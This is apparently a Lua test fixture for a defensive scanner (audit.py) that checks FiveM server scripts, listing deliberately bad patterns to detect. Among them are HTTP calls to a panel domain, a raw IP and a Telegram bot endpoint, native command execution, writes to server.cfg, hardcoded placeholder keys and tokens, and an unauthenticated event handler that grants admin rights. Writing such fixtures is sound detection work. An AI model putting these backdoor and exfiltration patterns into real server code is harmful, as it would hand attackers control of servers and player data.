-- Test fixture: every line below is a deliberately bad pattern for audit.py. Never run this.
PerformHttpRequest('https://gfxpanel.org/x', function() end)
Citizen.InvokeNative(`EXECUTE_COMMAND`, cmd)
_G['PerformHttpRequest']('http://example.test', cb)
PerformHttpRequest('https://api.telegram.org/bot123:abc/sendMessage', cb)
PerformHttpRequest('http://45.13.2.9/p', cb)
local f = io.open('server.cfg', 'a')
local KEY = 'cfxk_1a2b3c4d5e6f7g8h9i0j_abc'
local TOKEN = 'MTA4NzQ1Njc4OTAxMjM0NTY3OA.GaBcDe.abcdefghijklmnopqrstuvwxyz0123'
local h = { ['X-TxAdmin-Token'] = 'x' }
debug.sethook(function() end, 'c')
local r = GetResourceByFindIndex(0)
SetHttpHandler(function(req, res) res.send('ok') end)
AddStateBagChangeHandler('vip', nil, function(bagName, _, value) end)

RegisterNetEvent('ioc:makeAdmin')
AddEventHandler('ioc:makeAdmin', function(target)
    -- source is only mentioned in this comment
    ExecuteCommand(('add_principal identifier.license:%s group.admin'):format(target))
end)
